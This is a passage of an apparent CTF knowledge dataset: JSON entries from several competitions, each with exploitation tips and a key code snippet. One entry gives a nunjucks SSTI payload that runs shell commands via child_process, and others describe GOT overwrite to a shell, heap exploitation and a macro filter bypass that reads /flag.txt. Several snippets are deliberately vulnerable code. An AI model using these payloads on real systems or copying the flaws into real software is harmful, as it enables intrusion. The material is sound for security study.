            "When dealing with cryptographic challenges, especially those involving ECC (Elliptic Curve Cryptography), an important vulnerability to exploit is the small order of the curve. If the curve order is sufficiently small, it allows for the efficient solution of the ECDLP (Elliptic Curve Discrete Logarithm Problem) using mathematical tools or libraries such as Sagemath, which can utilize algorithms like Pohlig-Hellman. This method can be particularly useful in situations where you have the public key and you need to find the corresponding private key.",
            "In a scenario requiring interaction with a service for cryptographic operations, it is beneficial to script the process of command generation, signing, and communication with the service. Automating the signing of messages and the retrieval of cryptographic parameters (e.g., curve specifications and public keys) simplifies the process of exploiting vulnerabilities and executing attacks. Python, along with libraries for cryptographic calculations and network communication, such as PyCryptodome and sockets respectively, can be effectively used for this purpose.\n\nExample of automating ECC calculations and network communication:\n```python\nfrom sage.all import *\n# Pseudocode for solving ECDLP and interacting with a remote service\n# Initialize curve parameters a, b, p, G, H\nE = EllipticCurve(GF(p), [a, b])\nG = E(gen_x, gen_y)\nH = E(pub_x, pub_y)\n\n# Solve for the private key using ECDLP\nkey = discrete_log(H, G, operation='+')\n\n# Construct and sign the challenge message\nmessage = \"flag(name=file_name)\"  # Assuming file_name is known\n# Sign the message using the obtained key (simplified example)\nr, s = sign_message(message, key)\n\n# Send the signed message to the service\nsigned_message = {\"command\": \"flag\", \"params\": {\"name\": \"file_name\"}, \"signature\": {\"r\": r, \"s\": s}}\nsend_to_service(signed_message)\n```\nThis pseudocode showcases how to script the solving of ECDLP, signing of a message, and interaction with a remote service, applying general techniques from the given CTF challenge write-up."
        ],
        "key": "```python\nimport json\n\nclass FlagStorageSystem:\n    def __init__(self):\n        self.flags = {\"myflag\": \"flag{this_is_not_a_real_flag}\"}\n        self.signed_requests = {}\n\n    def help(self, command):\n        if command == \"flag\":\n            return \"Retrieve flag by name.\"\n        return \"Unknown command.\"\n\n    def flag(self, name=None):\n        if name in self.flags:\n            return self.flags[name]\n        return \"Flag not found.\"\n\n    def sign(self, command):\n        if command in self.signed_requests:\n            return self.signed_requests[command]\n        return \"Cannot sign this command.\"\n\n    def process_request(self, request):\n        try:\n            data = json.loads(request)\n            command = data.get(\"command\")\n            params = data.get(\"params\", {})\n            if command == \"help\":\n                return self.help(**params)\n            elif command == \"flag\":\n                return self.flag(**params)\n            elif command == \"sign\":\n                return self.sign(**params)\n            else:\n                return \"Invalid command.\"\n        except json.JSONDecodeError:\n            return \"Invalid JSON.\"\n\n# Example usage\nstorage = FlagStorageSystem()\nprint(storage.process_request('{\"command\": \"flag\", \"params\": {\"name\": \"myflag\"}}'))\n```"
    },
    {
        "name": "StrangeBytes",
        "write_up": "dataset/raw/StrangeBytes.md",
        "type": "crypto",
        "competition": [
            "DanteCTF/2023",
            "https://ctftime.org/event/2000/tasks/"
        ],
        "score": 490,
        "max_score": 500,
        "difficulty": 0.98,
        "knowledge": [
            "When dealing with challenges involving AES CBC encrypted files, it's crucial to look for patterns or repeating sequences within the encrypted files that could signify embedded information such as the encryption key, IV (Initialization Vector), or hints towards them. This is especially true if the challenge hints at \"strange\" aspects in the byte patterns of the files. For instance, identifying a consistent pattern across multiple files can lead to the discovery of embedded keys or IVs necessary for decryption.",
            "In scenarios where you've identified a potential embedded encryption key and IV within the encrypted files, and you know the encryption algorithm (AES CBC in this case), you can extract these elements and attempt decryption. This requires removing the identified pattern from the files and using the remaining bytes as input for the decryption process. The successful decryption of the files might lead to the recovery of the original data or the extraction of a flag if it's a CTF challenge. A Python script utilizing libraries like PyCryptoDome can be employed for this decryption process, where the identified bytes are used as key and IV.\n   \n   Example script structure (specific payload or script details not provided due to the context):\n   ```python\n   from Crypto.Cipher import AES\n   from Crypto.Util.Padding import unpad\n\n   # Assuming key and iv are the extracted bytes as identified from the repeating pattern\n   key = b'replaced_with_extracted_key'\n   iv = b'replaced_with_extracted_iv'\n\n   def decrypt_aes_cbc(encrypted_message):\n       cipher = AES.new(key, AES.MODE_CBC, iv)\n       decrypted_message = unpad(cipher.decrypt(encrypted_message), AES.block_size)\n       return decrypted_message\n\n   # Example usage\n   # encrypted_message = b'replaced_with_encrypted_data'\n   # print(decrypt_aes_cbc(encrypted_message))\n   ```"
        ],
        "key": "```python\ndef decrypt_file(file_path, key, iv):\n    from Crypto.Cipher import AES\n    with open(file_path, 'rb') as f:\n        ciphertext = f.read()\n    cipher = AES.new(key, AES.MODE_CBC, iv)\n    plaintext = cipher.decrypt(ciphertext)\n    return plaintext\n\ndef find_flag(directory):\n    import os\n    for filename in os.listdir(directory):\n        file_path = os.path.join(directory, filename)\n        key = b'\\x5c\\xf3\\xc0\\xf0\\x6f\\xfb\\x02\\xfe\\xa3\\x9b\\x6d\\xab\\xde\\x28\\x67\\x20\\x9e\\x96\\x86\\x34\\x63\\xa4\\xb7\\x8b\\x55\\xaa\\x4d\\x88\\xb0\\x33'\n        iv = b'\\x81\\x1e\\x3a\\xba\\x1b\\x25\\x79\\x44\\xaf\\xdf\\x4f\\x62\\x0b\\x0f\\xe4\\x7b\\xa1'\n        plaintext = decrypt_file(file_path, key, iv)\n        if b'DANTE' in plaintext:\n            print(plaintext)\n```"
    },
    {
        "name": "string",
        "write_up": "dataset/raw/string.equals(integer).md",
        "type": "misc",
        "competition": [
            "ByteBandits/2020",
            "https://ctftime.org/event/1022/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When facing hash function reverse engineering in CTF challenges, pre-calculating and storing the results of expensive computations can significantly optimize the brute-force process. In scenarios where the hash functions involve operations that are repeated across inputs, such as `pow(31, i, mod)` which doesn't change between hash calculations, pre-calculation and memorization can be utilized to speed up the hashing process. This approach is especially useful when the range of input parameters (e.g., the range of `i`) is known and limited.",
            "For challenges involving the identification or reverse-engineering of data based on its hash values, employing hash tables (dictionaries in Python) to map hash values to their corresponding original data strings allows for efficient lookup and reconstruction of the original dataset. This technique is particularly effective when dealing with a finite and reasonable number of possible data extracts or permutations, as pre-computing all hash values and then matching them against a provided list of hashes enables the quick retrieval of original data without the need for re-computation.\n\nExample of optimizing hash function using pre-calculation:\n```python\n# Pre-calculate powers of 31 mod mod and mod2\npows1 = [pow(31, i, mod) for i in range(105)]\npows2 = [pow(31, i, mod2) for i in range(105)]\n\ndef optimized_func1(s):\n    h = 0\n    for i in range(len(s)):\n        h += (ord(s[i]) - 96) * pows1[i]\n        h %= mod\n    return h\n\ndef optimized_func2(s):\n    h = 0\n    for i in range(len(s)):\n        h += (ord(s[i]) - 96) * pows2[i]\n        h %= mod2\n    return h\n```\n\nExample of reconstructing original data from hash values:\n```python\nmemorized_hashes = {hash_value: original_data for hash_value, original_data in precomputed_pairs}\nexpected_hashes = open(\"hashes.txt\", 'r').readlines()\noriginal_data_string = \"\"\nfor hash_value in expected_hashes:\n    original_data_string += memorized_hashes[hash_value.strip()]\n```"
        ],
        "key": "```python\ndef func1(s):  \n   h = 0  \n   for i in range(len(s)):  \n       h += (ord(s[i]) - 96) * pow(31, i, mod)  \n       h %= mod  \n   return h\n\ndef func2(s):  \n   h = 0  \n   for i in range(len(s)):  \n       h += (ord(s[i]) - 96) * pow(31, i, mod2)  \n       h %= mod2  \n   return h  \n```\n\n```python\ndef worker(x):  \n   print(x)  \n   file_data = open(\"a/\" + str(x)).read()  \n   memorized_hashes = {}  \n   for a in range(1, 1001):  \n       for b in range(a - 1, a + 101):  \n           s1 = file_data[a - 1: b]  \n           ha1 = func1(s1)  \n           ha2 = func2(s1)  \n           h = str(ha1) + \" \" + str(ha2)  \n           memorized_hashes[h] = s1  \n   return memorized_hashes  \n```\n\n```python\n   expected_hashes = open(\"hashes.txt\", 'r').readlines()  \n   s = \"\"  \n   for h in expected_hashes:  \n       s1 = memorized_hashes[h.strip()]  \n       s += s1  \n```"
    },
    {
        "name": "Strong padlock",
        "write_up": "dataset/raw/Strong padlock.md",
        "type": "This is a **reverse** challenge.",
        "competition": [
            "RaziCTF/2020",
            "https://ctftime.org/event/1167/tasks/"
        ],
        "score": -1,
        "max_score": 996,
        "difficulty": -1,
        "knowledge": [
            "When needing to bypass repetitive tasks within an Android application, such as clicking a button numerous times, utilizing Frida to hook into the application's methods can automate or directly manipulate the application's behavior to achieve the desired result. This can be especially useful when direct interaction with the application is impractical due to the sheer volume of required interactions.\n   - Example payload:\n     ```javascript\n     const switcher = Java.use(\"com.example.razictf.switcher\").$new();\n     console.log(switcher.run(18)+switcher.run(15)+switcher.run(12)+switcher.run(10)+switcher.run(5));\n     ```",
            "Decompile Android applications using tools like JADX to analyze the application's code. This can help in understanding the application's logic, identifying crucial functions, and crafting Frida scripts to interact with these functions directly. This approach is particularly useful for extracting specific parts of data, such as flag parts in CTF challenges, without following the intended use of the application.\n   - No specific payload provided, as the knowledge extracted is about the process of analyzing and crafting scripts based on the application's decompiled code."
        ],
        "key": "```java\npublic class switcher {\n    public String run(int i) {\n        switch (i) {\n            case 18:\n                return \"flag_part_1\";\n            case 15:\n                return \"flag_part_2\";\n            case 12:\n                return \"flag_part_3\";\n            case 10:\n                return \"flag_part_4\";\n            case 5:\n                return \"flag_part_5\";\n            default:\n                return null;\n        }\n    }\n}\n```"
    },
    {
        "name": "strong-arm",
        "write_up": "dataset/raw/strong-arm.md",
        "type": "crypto",
        "competition": [
            "WPICTF/2021",
            "https://ctftime.org/event/1208/tasks/"
        ],
        "score": 300,
        "max_score": 500,
        "difficulty": 0.6,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities in ARM64 architecture, it's essential to understand how the ARM64 calling convention works, especially that `x30` holds the return address and not the stack. This knowledge is crucial to forge Return Oriented Programming (ROP) chains accurately. An example strategy involves using gadgets to manipulate `x19` and `x20` registers to eventually control `x0` for system call arguments.",
            "In scenarios involving return-to-libc (ret2libc) attacks where the binary has a Global Offset Table (GOT) that is not write-protected, one can overwrite GOT entries to hijack the control flow of the program. Specifically, you can overwrite function pointers in the GOT with addresses of desired libc functions (like `system`) and control arguments through subsequent program input. This technique is effective for bypassing non-executable stack protections and securing a shell. Example payload steps would include crafting a payload to: \n   - overflow the buffer to reach the GOT,\n   - overwrite a GOT entry (e.g., `puts`) with the address of a critical libc function (e.g., `system`),\n   - ensure subsequent function calls use the overwritten GOT entry to execute chosen functions (like having subsequent `puts` calls actually call `system(\"/bin/sh\")`)."
        ],
        "key": "```c\n#include <stdio.h>  \n#include <stdlib.h>  \n#include <unistd.h>\n\nint vulnerable() {  \n   char buffer[128];\n\n   printf(\"> \");  \n   fflush(stdout);  \n   gets(buffer);  \n   puts(\"Your Input: \\n\");  \n   puts(buffer);  \n   fflush(stdout);  \n}\n\nint main(int argc, char** argv) {  \n   printf(\"print at %p\\n\", printf);  \n   vulnerable();  \n   return EXIT_SUCCESS;  \n}  \n```"
    },
    {
        "name": "StrVec",
        "write_up": "dataset/raw/StrVec.md",
        "type": "pwn",
        "competition": [
            "ASIS/2021/Quals",
            "https://ctftime.org/event/1415/tasks/"
        ],
        "score": 114,
        "max_score": 500,
        "difficulty": 0.228,
        "knowledge": [
            "In challenges involving heap exploitation, if the programming logic uses manual arithmetic for buffer sizes instead of secure functions like `calloc`, there is a risk of integer overflow leading to incorrect memory allocation sizes. This can be exploited to perform out of bounds read or write operations. When creating or manipulating heap-based data structures, always check for possible integer overflows that can lead to erroneous memory allocations. For example, by crafting inputs that cause the size calculations to overflow, an attacker can manipulate the program's memory in unintended ways.",
            "For leaking libc addresses through manipulation of the heap, strategically crafted heap chunks can be utilized. Specifically, by creating a fake heap chunk with carefully set headers and placing it in such a way that it gets moved to the unsorted bin, one can leak libc addresses stored in the forward and backward pointers of the chunk. The technique requires understanding of glibc's memory allocation mechanisms, especially how chunks are moved between different bins (t-caches, fast bins, unsorted bins) upon allocation and free operations. In practice, this method can be applied by first filling up the t-cache for a particular chunk size to ensure the next freed chunk of that size moves to the unsorted bin, followed by crafting and freeing a fake chunk with a size that isn't cached by t-caches to leak the libc address from its fd/bk pointers."
        ],
        "key": "```c\nvector *vector_new(int nmemb) {  \n if (nmemb <= 0)  \n   return NULL;\n\n int size = sizeof(vector) + sizeof(void*) * nmemb;  \n vector *vec = (vector*)malloc(size);  \n if (!vec)  \n   return NULL;\n\n memset(vec, 0, size);  \n vec->size = nmemb;\n\n return vec;  \n}  \n```"
    },
    {
        "name": "StudySim",
        "write_up": "dataset/raw/StudySim.md",
        "type": "pwn",
        "competition": [
            "HSCTF/2020",
            "https://ctftime.org/event/939/tasks/"
        ],
        "score": 495,
        "max_score": 500,
        "difficulty": 0.99,
        "knowledge": [
            "When a binary allows changing a counter that dictates the number of allocated objects without proper validation, it may be possible to manipulate this value to gain arbitrary read or write capabilities. This is especially dangerous in scenarios where the objects are managed in a global array and their pointers can be manipulated through heap allocation functions like `malloc`. An attacker can exploit this by adjusting the counter to a negative value or a value that is out of bounds, turning a heap allocation into an arbitrary memory write operation.",
            "In a challenge where the binary does not directly leak heap or libc addresses, utilizing the program's functionalities to manipulate memory can lead to controlled leaks. By abusing a heap allocation vulnerability to place a malloc pointer into a global variable or a specific memory location (like a counter variable) and then causing the program to print this variable, an attacker can leak a heap address. Similarly, to leak libc addresses, manipulating the memory to align a malloc'd area next to GOT entries, and then triggering a read operation, can expose crucial addresses. This requires careful management of heap state and an understanding of the binary's memory layout to successfully position the required pointers next to target read locations without causing program instability.\n\nExample payloads cannot be specifically generated due to the complexity and dependency on the binary's structure and memory state at the time of exploitation."
        ],
        "key": "```c  \nvoid do_worksheets()  \n{  \n\tputs(\"How many worksheets would you like to finish?\");  \n\tunsigned long num_worksheets;  \n\tread_ulong(&num_worksheets);  \n  \n\tallocated_count -= num_worksheets;  \n\tprintf(\"You did %lu worksheets. Only %ld more to go!\\n\",num_worksheets,allocated_count);  \n}  \n\nchar * book = (char *) malloc(length + 1);  \nif (book == NULL) {  \n\texit(1);  \n}  \nputs(\"What's the content of your worksheet?\");  \nread_str(book, length);  \nstack[allocated_count] = book;  \n```"
    },
    {
        "name": "Suffarring",
        "write_up": "dataset/raw/Suffarring.md",
        "type": "The type of this CTF challenge is **pwn**.",
        "competition": [
            "PlaidCTF/2019",
            "https://ctftime.org/event/743/tasks/"
        ],
        "score": 500,
        "max_score": 666,
        "difficulty": 0.7507507507507507,
        "knowledge": [
            "In a binary exploitation challenge, specifically when dealing with heap-based vulnerabilities, if the input length (needle) can be controlled and made longer than the buffer (haystack), a heap overflow can be induced. This scenario requires a program that does not correctly check or mistakenly trusts user input lengths, leading to potential arbitrary code execution or information disclosure. Example payload structure for heap overflow (simplified for conceptual understanding):\n    ```\n    payload = \"<controlled data to overflow buffer>\" + \"<new heap header>\" + \"<controlled next chunk size or data>\"\n    ```",
            "After triggering a heap overflow, it can be exploited to modify adjacent heap chunks' metadata. This includes changing the size and metadata pointers of following chunks, which can lead to a condition where arbitrary memory read/write operations become possible. This technique is particularly powerful in environments using tcache (thread caching) malloc implementations, where exploiting the overflow can lead to hijacking of the execution flow or data leakage, such as leaking LIBC addresses. This knowledge applies universally across programs that use similar memory allocation strategies, and it exploits the lack of safeguard checks around heap chunk sizes and pointers.\n   \n    There's no specific payload structure provided for this exploitation technique since it varies greatly depending on the target program's memory layout and the actual heap management implementation (e.g., glibc, tcache). The concept, however, remains that manipulating the metadata of heap chunks adjacent to an overflowed chunk allows for advanced exploitation scenarios."
        ],
        "key": "```c\nvoid recant_needle(char *haystack, char *needle) {\n    size_t haystack_len = strlen(haystack);\n    size_t needle_len = strlen(needle);\n\n    if (needle_len > haystack_len) {\n        // Vulnerability: No proper bounds checking\n        memcpy(haystack, needle, needle_len);\n    }\n}\n```"
    },
    {
        "name": "SunSet introspecTIon",
        "write_up": "dataset/raw/SunSet introspecTIon.md",
        "type": "web",
        "competition": [
            "UACWS/2022",
            "https://ctftime.org/event/1674/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When encountering a web application that uses the NodeJS Express framework, if the application dynamically renders user input without proper sanitization, it may be vulnerable to Server Side Template Injection (SSTI). The presence of suspicious clues in titles, headers, or descriptions can hint at possible attack vectors. In the scenario where \"SunSet introspecTIon\" and a template engine like \"nunjucks\" is mentioned, SSTI can be tested and exploited by injecting template syntax into input fields. To confirm SSTI, test by injecting `{{7*7}}`; a response of 49 indicates a successful template injection.\n\n    **Example payload for testing SSTI:**\n    ```{{7*7}}```",
            "Once SSTI vulnerability is confirmed in an application using Express and Nunjucks, arbitrary command execution can be achieved by abusing the template engine's functionality. This can be particularly leveraged by using the template engine's constructor function to bypass restrictions and execute system commands. This approach taps into NodeJS's `require` function to execute system commands via `child_process`. Remember to adjust payloads according to the application's environment and the desired outcome, such as reading files or listing directories.\n\n    **Example payload for command execution:**\n    ```{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('ls -la')\")()}}```"
        ],
        "key": "```js\napp.get('/display', function(req, res) {\n    var payload = req.query.payload;\n    res.send(nunjucks.renderString(payload));\n});\n```"
    },
    {
        "name": "Super Secure Vault",
        "write_up": "dataset/raw/Super Secure Vault.md",
        "type": "crypto",
        "competition": [
            "Pragyan/2019",
            "https://ctftime.org/event/755/tasks/"
        ],
        "score": 400,
        "max_score": 400,
        "difficulty": 1.0,
        "knowledge": [
            "When faced with an algorithm that requires you to find a specific input based on modular conditions, and if these moduli are co-prime, applying the Chinese Remainder Theorem (CRT) provides a systematic way to solve for the input. This method is particularly useful in scenarios where the solution to a system of modular linear equations is needed, and it ensures that a unique solution exists modulo the product of the moduli. The Chinese Remainder Theorem can be implemented programmatically to automate the solution process.\n   \n   - For instance, given the modular conditions:\n     ```\n     s = 213 mod 27644437\n     s = 229 mod 10459\n     s = 25 mod 1489\n     s = 83 mod 1046527\n     s = 135 mod 16127\n     ```\n     One can use CRT to find a unique solution for `s`.",
            "In scenarios involving encryption or hashing challenges that utilize a known \"matrix\" or table of values to transform input data based on specific rules (such as concatenating certain strings or modifying input in other systematic ways), deciphering the output can be achieved by reverse-engineering the process. This requires understanding the transformation logic applied to the input and carefully crafting an algorithm that can calculate the indices or positions within the matrix or table based on the manipulated input, thus revealing the original input or password.\n   \n   - To decipher the output, an example algorithm could look like:\n     ```python\n     v12 = str(s) + str(N) + \"80\"  # Concatenate strings and additional characters as per challenge logic.\n     v12 = list(map(int, list(v12)))  # Convert the string into individual integers for processing.\n\n     password = b\"\"\n     # Logic to calculate indices based on transformed input and retrieve corresponding values from matrix.\n     while condition:\n         index = some_calculation(v12)  # Calculate index based on challenge logic.\n         password += bytes([matrix[index]])  # Append the byte from the matrix at the calculated index to the password.\n     print(password)\n     ```\n     This example logic is particularly relevant when the transformation process involves complex manipulations like concatenation of a large number with another string followed by specific operations as mentioned in the challenge."
        ],
        "key": "```c\nint __fastcall func2(__int64 a1, char *a2, const char *a3)  \n{  \n unsigned __int64 v3; // rax  \n int v4; // ST30_4  \n int v5; // ST34_4  \n int v7; // [rsp+24h] [rbp-3Ch]  \n int v8; // [rsp+28h] [rbp-38h]  \n int v9; // [rsp+28h] [rbp-38h]  \n int v10; // [rsp+2Ch] [rbp-34h]  \n int v11; // [rsp+2Ch] [rbp-34h]  \n char *v12; // [rsp+40h] [rbp-20h]  \n  \n v12 = strcat(a2, a3);  \n v3 = (unsigned __int64)&v12[strlen(v12)];  \n *(_WORD *)v3 = 12344;  \n *(_BYTE *)(v3 + 2) = 0;  \n v7 = 0;  \n v8 = 0;  \n v10 = strlen(v12) >> 1;  \n while ( v8 < strlen(v12) >> 1 )  \n {  \n   if ( *(_BYTE *)(v7 + a1) != matrix[100 * (10 * (v12[v8] - 48) + v12[v8 + 1]\n- 48)  \n                                    - 48  \n                                    + 10 * (v12[v10] - 48)  \n                                    + v12[v10 + 1]] )  \n     fail(1LL);  \n   ++v7;  \n   v8 += 2;  \n   v10 += 2;  \n }  \n v9 = 0;  \n v11 = strlen(v12) >> 1;  \n while ( v9 < strlen(v12) >> 1 )  \n {  \n   v4 = 10 * (v12[v9] - 48) + v12[v9 + 1] - 48;  \n   v5 = 10 * (v12[v11] - 48) + v12[v11 + 1] - 48;  \n   if ( *(_BYTE *)(v7 + a1) != matrix[100 * (v4 * v4 % 97) + v5 * v5 % 97] )  \n     fail(1LL);  \n   ++v7;  \n   v9 += 2;  \n   v11 += 2;  \n }  \n puts(\"Your Skills are really great. Flag is:\");  \n return printf(\"pctf{%s}\\n\", a1);  \n}\n```"
    },
    {
        "name": "SuperCurve",
        "write_up": "dataset/raw/SuperCurve.md",
        "type": "crypto",
        "competition": [
            "CSAW/2019/Quals",
            "https://ctftime.org/event/870/tasks/"
        ],
        "score": 300,
        "max_score": 500,
        "difficulty": 0.6,
        "knowledge": [
            "When solving Elliptic Curve Discrete Logarithm Problems (ECDLP) with a small prime number `p` as the field size, brute force or algorithmic methods like using SageMath's `discrete_log` function can effectively find the solution. Condition: This approach is effective if the field size `p` is sufficiently small to allow practical computation times. Example command snippet using SageMath for ECDLP:  \n```python\na, b = 1, -1  # Curve parameters\np = 14753  # Small prime number field size\nE = EllipticCurve(Zmod(p), [a, b])  # Define the elliptic curve\nG = E(1, 1)  # Base point\nP = E(Px, Py)  # Public key point\nd = discrete_log(P, G, operation=\"+\")  # Solve for the discrete logarithm\n```",
            "For ensuring the security of elliptic curve cryptography, it is critical to use secure parameters. The challenge highlights this by naming the flag `use_good_params`, suggesting the vulnerability was due to poor parameter choice. Condition: This advice is paramount when designing or auditing cryptographic systems based on elliptic curves. The use of weak parameters can lead to the compromise of the cryptographic primitives and, consequently, the security of the system."
        ],
        "key": "```python\na, b = 1, -1  \np = 14753  \nE = EllipticCurve(Zmod(p), [a, b])  \nG = E(1, 1)  \nP = E(Px, Py)  \nd = discrete_log(P, G, operation=\"+\")  \nassert P == d * G  \n# d == secret_scalar  \n```"
    },
    {
        "name": "Susan Landau",
        "write_up": "dataset/raw/Susan Landau.md",
        "type": "web",
        "competition": [
            "CyberHeroines/2023",
            "https://ctftime.org/event/2054/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "When facing a web challenge that involves CSRF tokens as part of its security mechanism, closely inspect the site\u2019s cookies for any unusual or interesting tokens that stand apart from common ones like PHPSESSID. This inspection could reveal opportunities to exploit the security by altering these tokens. A practical step involves checking if these tokens, particularly csrf_token, can be decrypted or manipulated to bypass security checks.",
            "If a challenge provides hints towards using specific names or terms and involves encryption or hashing, consider converting these hints into their hashed (e.g., MD5) equivalents before using them. This approach is especially relevant when the hint or clue seems related to authentication mechanisms or where specific tokens or keywords are expected in a certain encrypted form. For instance, converting 'cyberheroine' into its MD5 hash (*09a206b401aaa7b5315e1d814ce16896*) and using this as a token or password to access restricted areas."
        ],
        "key": "```php\n<?php\nsession_start();\n\nif (!isset($_SESSION['csrf_token'])) {\n    $_SESSION['csrf_token'] = md5('hack this');\n}\n\nfunction check_csrf_token($token) {\n    return $token === $_SESSION['csrf_token'];\n}\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $user_token = $_POST['csrf_token'];\n    if (check_csrf_token($user_token)) {\n        echo \"Access granted!\";\n    } else {\n        echo \"Access denied!\";\n    }\n}\n?>\n```"
    },
    {
        "name": "Sushi",
        "write_up": "dataset/raw/Sushi.md",
        "type": "misc",
        "competition": [
            "WPICTF/2019",
            "https://ctftime.org/event/728/tasks/"
        ],
        "score": 300,
        "max_score": 500,
        "difficulty": 0.6,
        "knowledge": [
            "When faced with a custom encoding challenge where the encoded message uses a delineated structure with unique letter patterns, closely examine any provided hints or images for a matching pattern or grid. This approach is particularly effective if the encoding uses a subset of characters (like 'A' to 'Y') and includes peculiarities like case insensitivity or delimiter usage to separate encoding units. This understanding can then be applied to reverse engineer the encoding mechanism. \n   - Condition: Applicable to challenges leveraging custom encodings with visual or text-based hints.\n   - Knowledge: Identifying a corresponding pattern or grid in hints can reveal the encoding strategy, especially if the encoding operates over a constrained alphabet and uses delimiters to segment data.",
            "In encoding schemes where letters within a unit are duplicated an arbitrary number of times and the presence of a character in a decoded message depends on the parity of its occurrences (odd or even), apply logical operations like XOR to convert the set of letters in an encoded unit back to meaningful data. This technique is useful in converting seemingly random character sets into a decipherable format, leveraging the insight that the final state of a letter (active or inactive) can be determined by its frequency of occurrence.\n   - Condition: Suitable for challenges where encoded data is represented by repeating characters whose significance is dictated by their number of appearances within each unit of the encoding.\n   - Knowledge: Utilizing XOR logic on character occurrences can decode messages in custom encoding schemes where the repetition of characters indicates their presence or absence in the final decoded message."
        ],
        "key": "```python\ndef decode(encoded_data):\n    grid = [\n        ['A', 'B', 'C', 'D', 'E'],\n        ['F', 'G', 'H', 'I', 'J'],\n        ['K', 'L', 'M', 'N', 'O'],\n        ['P', 'Q', 'R', 'S', 'T'],\n        ['U', 'V', 'W', 'X', 'Y']\n    ]\n    \n    def xor_letters(unit):\n        result = 0\n        for letter in unit:\n            result ^= ord(letter.upper()) - ord('A')\n        return result\n\n    def trace_character(xor_result):\n        for i, row in enumerate(grid):\n            for j, letter in enumerate(row):\n                if xor_result == (i * 5 + j):\n                    return letter\n        return '?'\n\n    decoded_message = []\n    units = encoded_data.split('z')\n    for unit in units:\n        if unit:\n            xor_result = xor_letters(unit)\n            decoded_message.append(trace_character(xor_result))\n    \n    return ''.join(decoded_message)\n\n# Example usage\nencoded_data = \"aAbBcCzDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz\"\ndecoded_message = decode(encoded_data)\nprint(decoded_message)\n```"
    },
    {
        "name": "SW Expert Academy",
        "write_up": "dataset/raw/SW Expert Academy.md",
        "type": "web",
        "competition": [
            "HackersPlayground/2021",
            "https://ctftime.org/event/1396/tasks/"
        ],
        "score": 121,
        "max_score": 187,
        "difficulty": 0.6470588235294118,
        "knowledge": [
            "When dealing with challenges involving server-side code execution with source code filters, one can bypass restrictions on certain keywords (like function names or symbols) through the use of C macros combined with digraphs. This technique allows the concatenation of filtered keywords at compile time, bypassing the filter without directly writing the prohibited terms in the source code. Instead of using the `#` symbol for macros, digraphs can be utilized (e.g., `%:` instead of `#` for defining macros).  \n**Example payload**:  \n   ```C\n   %:define OPEN(path, mode) fop%:%:en(path, mode)\n   %:define SCAN(f, fmt, buf) fsca%:%:nf(f, fmt, buf)\n   ```",
            "In scenarios where direct access to files or execution of certain functions is restricted by filters in code-injection challenges, triggering execution errors intentionally can be leveraged to leak file contents or other sensitive information. By exploiting the server's behavior of revealing error messages, one can force the program to exit with an error after attempting to perform a restricted action or accessing a prohibited file, which causes the server to return the error details. This method relies on creative ways to include the blocked operations or filenames indirectly to trigger meaningful errors revealing useful information.  \n**Example concept**: Attempting to read a file and then intentionally causing an error to leak the file's contents through error messages, without directly using prohibited function names or keywords in the payload."
        ],
        "key": "```c\n%:define OPEN(path, mode) fop%:%:en(path, mode)  \n%:define SCAN(f, fmt, buf) fsca%:%:nf(f, fmt, buf)\n\nint leak_flag() {  \n   char buf[128];  \n   FILE *f;  \n   f = OPEN(\"/flag.txt\", \"r\");  \n   SCAN(f, \"%s\", buf);  \n   fprintf(stderr, buf);  \n}\n```"
    },
    {
        "name": "Symatrix",
        "write_up": "dataset/raw/Symatrix.md",
        "type": "The type of this CTF challenge is **forensics**.",
        "competition": [
            "GoogleCTF/2023",
            "https://ctftime.org/event/1929/tasks/"
        ],
        "score": 114,
        "max_score": 320,
        "difficulty": 0.35625,
        "knowledge": [
            "When faced with an encoded message hidden within the pixels of a PNG image using a proprietary steganography algorithm, analysis of the algorithm's embedded data manipulation technique is crucial. If the algorithm embeds data by modifying the least significant bits of pixel values, look for patterns in pixel modifications, such as consistent changes in the blue channel or markers in another channel (e.g., green) indicating modified pixels. This understanding can guide the development of a decoding script that inversely applies the algorithm to extract the hidden data.",
            "In steganography challenges where the encoder adds a bit to a specific color channel of a pixel (e.g., the blue channel) and uses another channel (e.g., the green channel) to flag pixels carrying hidden bits, a decoding approach can reverse this by iterating over pixels to reconstruct the binary string of hidden data. The extracted bits can then be converted from binary to hexadecimal, and finally to ASCII to reveal the hidden message. This method requires careful attention to the initial encoding logic, specifically how bits are represented and spaced within the image's pixel data structure.\n   \n   Example payload snippet for decoding based on the observed encoding pattern:\n```py\nbinary_result_string = ''\nfor pixel in modified_pixels:\n    if pixel_indicates_data(pixel):\n        binary_result_string += extract_bit_from_pixel(pixel)\nhidden_data = binary_to_ascii(binary_result_string)\n```"
        ],
        "key": "```python\nfrom PIL import Image  # <<<<<<<<<<<<<<  \nfrom random import randint  \nimport binascii\n\ndef hexstr_to_binstr(hexstr):  # <<<<<<<<<<<<<<  \n   n = int(hexstr, 16)  \n   bstr = ''  \n   while n > 0:  \n       bstr = str(n % 2) + bstr  \n       n = n >> 1  \n   if len(bstr) % 8 != 0:  \n       bstr = '0' + bstr  \n   return bstr  # <<<<<<<<<<<<<<\n\ndef pixel_bit(b):  # <<<<<<<<<<<<<<  \n   return tuple((0, 1, b))\n\ndef embed(t1, t2):  # <<<<<<<<<<<<<<  \n   return tuple((t1[0] + t2[0], t1[1] + t2[1], t1[2] + t2[2]))\n\ndef full_pixel(pixel):  # <<<<<<<<<<<<<<  \n   return pixel[1] == 255 or pixel[2] == 255\n\nprint(\"Embedding file...\")\n\nbin_data = open(\"./flag.txt\", 'rb').read()  \ndata_to_hide = binascii.hexlify(bin_data).decode('utf-8')\n\nbase_image = Image.open(\"./original.png\")\n\nx_len, y_len = base_image.size  \nnx_len = x_len\n\nnew_image = Image.new(\"RGB\", (nx_len, y_len))\n\nbase_matrix = base_image.load()  \nnew_matrix = new_image.load()\n\nbinary_string = hexstr_to_binstr(data_to_hide)  \nremaining_bits = len(binary_string)\n\nnx_len = nx_len - 1  \nnext_position = 0\n\nfor i in range(0, y_len):  # <<<<<<<<<<<<<<  \n   for j in range(0, x_len):  \n       pixel = new_matrix[j, i] = base_matrix[j, i]\n\n       if remaining_bits > 